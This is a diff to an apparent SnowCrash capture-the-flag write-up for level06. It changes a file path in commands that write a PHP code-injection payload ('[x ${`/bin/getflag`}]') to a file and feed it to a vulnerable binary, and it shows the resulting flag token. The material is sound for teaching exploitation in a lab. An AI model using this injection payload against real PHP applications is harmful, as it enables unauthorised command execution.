@@ -46,8 +46,8 @@ print $r;
 Create a file with malicious content:
 
 ```bash
-level06@SnowCrash:~$ echo '[x ${`/bin/getflag`}]' > /tmp/exploit/input
-level06@SnowCrash:~$ ./level06 /tmp/exploit/input
+level06@SnowCrash:~$ echo '[x ${`/bin/getflag`}]' > /tmp/input
+level06@SnowCrash:~$ ./level06 /tmp/input
 PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 ```
 
